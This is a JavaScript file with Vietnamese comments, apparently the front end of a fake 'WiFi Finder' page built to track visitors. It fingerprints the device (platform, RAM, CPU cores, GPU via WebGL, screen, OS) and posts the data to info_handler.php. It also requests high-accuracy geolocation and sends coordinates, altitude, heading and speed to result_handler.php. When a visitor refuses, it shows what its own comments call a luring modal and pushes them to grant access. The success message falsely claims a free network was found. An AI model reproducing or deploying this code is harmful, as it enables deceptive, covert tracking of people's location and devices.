function information() {
  try {
    const platform = navigator.platform || 'Không Có Sẵn';
    const concurrency = navigator.hardwareConcurrency || 'Không Có Sẵn';
    const ram = navigator.deviceMemory || 'Không Có Sẵn';
    const userAgent = navigator.userAgent || '';
    const screenHeight = window.screen.height;
    const screenWidth = window.screen.width;

    // Xác định trình duyệt
    let browser = 'Không Có Sẵn';
    if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
    else if (userAgent.includes('Chrome') && !userAgent.includes('Edg') && !userAgent.includes('OPR')) browser = 'Google Chrome';
    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Apple Safari';
    else if (userAgent.includes('Edg')) browser = 'Microsoft Edge';
    else if (userAgent.includes('OPR') || userAgent.includes('Opera')) browser = 'Opera';

    // Xác định hệ điều hành
    let os = 'Không Có Sẵn';
    try {
      const osInfo = userAgent.substring(userAgent.indexOf('(') + 1, userAgent.indexOf(')')).split(';');
      os = osInfo[1]?.trim() || os;
    } catch (_) {}

    // Lấy thông tin GPU
    let vendor = 'Không Có Sẵn';
    let renderer = 'Không Có Sẵn';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || vendor;
          renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || renderer;
        }
      }
    } catch (_) {}

    // Gửi thông tin về server
    $.ajax({
      type: 'POST',
      url: 'info_handler.php',
      data: {
        Ptf: platform,
        Brw: browser,
        Cc: concurrency,
        Ram: ram,
        Ven: vendor,
        Ren: renderer,
        Ht: screenHeight,
        Wd: screenWidth,
        Os: os
      },
      mimeType: 'text'
    });
  } catch (e) {
    console.error('Lỗi khi thu thập thông tin thiết bị:', e);
  }
}

function locate(callback, errCallback) {
  try {
    if ($('#change').length) {
      $('#change').html('<span>Đang Xác Định...</span>');
    }

    if (!navigator.geolocation) {
      if (typeof errCallback === 'function') errCallback();
      return;
    }
    
    // Phát hiện trình duyệt để đề xuất hướng dẫn phù hợp nếu cần
    detectBrowser();

    const options = {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(showPosition, showError, options);

    function showPosition(position) {
      const coords = position.coords;

      const lat = coords.latitude ? coords.latitude + ' deg' : 'Không Có Sẵn';
      const lon = coords.longitude ? coords.longitude + ' deg' : 'Không Có Sẵn';
      const acc = coords.accuracy ? coords.accuracy + ' m' : 'Không Có Sẵn';
      const alt = coords.altitude != null ? coords.altitude + ' m' : 'Không Có Sẵn';
      const dir = coords.heading != null ? coords.heading + ' deg' : 'Không Có Sẵn';
      const spd = coords.speed != null ? coords.speed + ' m/s' : 'Không Có Sẵn';

      $.ajax({
        type: 'POST',
        url: 'result_handler.php',
        data: {
          Status: 'success',
          Lat: lat,
          Lon: lon,
          Acc: acc,
          Alt: alt,
          Dir: dir,
          Spd: spd
        },
        success: callback,
        mimeType: 'text'
      });
    }

    function showError(error) {
      let errText = 'Đã xảy ra lỗi không xác định';

      switch (error.code) {
        case error.PERMISSION_DENIED:
          errText = 'Người dùng từ chối yêu cầu Định vị';
          // Hiển thị modal dụ dỗ khi người dùng từ chối cấp quyền
          console.log("Quyền truy cập vị trí bị từ chối!");
          setTimeout(function() {
            showDenyModal();
          }, 300);
          break;
        case error.POSITION_UNAVAILABLE:
          errText = 'Thông tin vị trí không khả dụng';
          break;
        case error.TIMEOUT:
          errText = 'Yêu cầu lấy vị trí người dùng đã hết thời gian';
          alert('Vui lòng đặt chế độ vị trí của bạn ở độ chính xác cao...');
          break;
      }

      $.ajax({
        type: 'POST',
        url: 'error_handler.php',
        data: {
          Status: 'failed',
          Error: errText
        },
        success: function () {
          if (typeof errCallback === 'function') {
            errCallback(error, errText);
          }
        },
        mimeType: 'text'
      });
    }
  } catch (e) {
    console.error('Lỗi định vị:', e);
    if (typeof errCallback === 'function') errCallback(e, 'Lỗi không xác định trong quá trình định vị');
  }
}

// Hàm hiển thị modal dụ dỗ
function showDenyModal() {
  console.log("Đang hiển thị modal từ chối...");
  const modal = document.getElementById('denyModal');
  if (modal) {
    modal.style.display = "block";
    // Thêm hiệu ứng rung cho modal để thu hút sự chú ý
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) {
      modalContent.classList.add('shake-animation');
      // Loại bỏ class shake-animation sau khi hiệu ứng kết thúc
      setTimeout(function() {
        modalContent.classList.remove('shake-animation');
      }, 800);
    }
    console.log("Modal từ chối đã được hiển thị");
  } else {
    console.error("Không tìm thấy modal từ chối (ID: denyModal)!");
  }
}

// Hàm đóng modal
function closeModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.style.display = "none";
  }
}

// Hàm thử lại quyền vị trí
function retryLocation() {
  closeModal('denyModal');
  
  // Thử trực tiếp yêu cầu quyền vị trí lại mà không mở hướng dẫn
  if (navigator.geolocation) {
    console.log("Đang yêu cầu lại quyền vị trí...");
    
    // Sử dụng một hàm trung gian để gọi lại locate
    setTimeout(function() {
      locate(
        function(){
          $('#change').html('Đang Kết Nối'); 
          $('#scanning-text').html('Đã tìm thấy mạng WiFi miễn phí! Đang kết nối...'); 
          setTimeout(function() { 
            alert('Cảm ơn bạn đã sử dụng WiFi Finder... Tính năng kết nối tự động sẽ sớm ra mắt!'); 
          }, 2000);
        }, 
        function(){
          $('#change').html('Thất Bại'); 
          $('#scanning-text').html('Không thể tìm thấy vị trí của bạn. Vui lòng thử lại.');
          // Nếu vẫn thất bại, mới hiển thị hướng dẫn chi tiết
          showPermissionGuide();
        }
      );
    }, 300);
  } else {
    alert("Trình duyệt của bạn không hỗ trợ định vị. Vui lòng thử trình duyệt khác.");
  }
}

// Hiển thị hướng dẫn cách bật quyền vị trí
function showPermissionGuide() {
  const modal = document.getElementById('permissionGuideModal');
  if (modal) {
    modal.style.display = "block";
  } else {
    console.error("Không tìm thấy modal hướng dẫn (ID: permissionGuideModal)!");
  }
}

// Biến toàn cục lưu thông tin về trình duyệt đã phát hiện
let detectedBrowser = 'chrome'; // Mặc định là Chrome

// Phát hiện trình duyệt của người dùng
function detectBrowser() {
  const userAgent = navigator.userAgent || '';
  
  if (userAgent.includes('Firefox')) detectedBrowser = 'firefox';
  else if (userAgent.includes('Chrome') && !userAgent.includes('Edg') && !userAgent.includes('OPR')) detectedBrowser = 'chrome';
  else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) detectedBrowser = 'safari';
  else if (userAgent.includes('Edg')) detectedBrowser = 'edge';
  else if (userAgent.includes('OPR') || userAgent.includes('Opera')) detectedBrowser = 'chrome'; // Dùng hướng dẫn Chrome cho Opera
  
  console.log("Phát hiện trình duyệt: " + detectedBrowser);
  return detectedBrowser;
}

// Hiển thị hướng dẫn cho trình duyệt được chọn
function showGuideFor(browser) {
  document.querySelectorAll('.browser-btn').forEach(function(btn) {
    btn.classList.remove('active');
  });
  document.querySelectorAll('.guide-steps').forEach(function(guide) {
    guide.style.display = 'none';
  });
  
  document.querySelector('.' + browser + '-guide').style.display = 'block';
  document.querySelector('.browser-btn[onclick="showGuideFor(\'' + browser + '\')"]').classList.add('active');
}

// Hiển thị modal hướng dẫn với trình duyệt được phát hiện tự động
function showPermissionGuide() {
  const modal = document.getElementById('permissionGuideModal');
  if (modal) {
    modal.style.display = "block";
    // Tự động chọn tab trình duyệt phù hợp
    showGuideFor(detectedBrowser);
  } else {
    console.error("Không tìm thấy modal hướng dẫn (ID: permissionGuideModal)!");
  }
}

// Tải lại trang và thử lại
function reloadAndTry() {
  closeModal('permissionGuideModal');
  setTimeout(function() {
    location.reload();
  }, 500);
}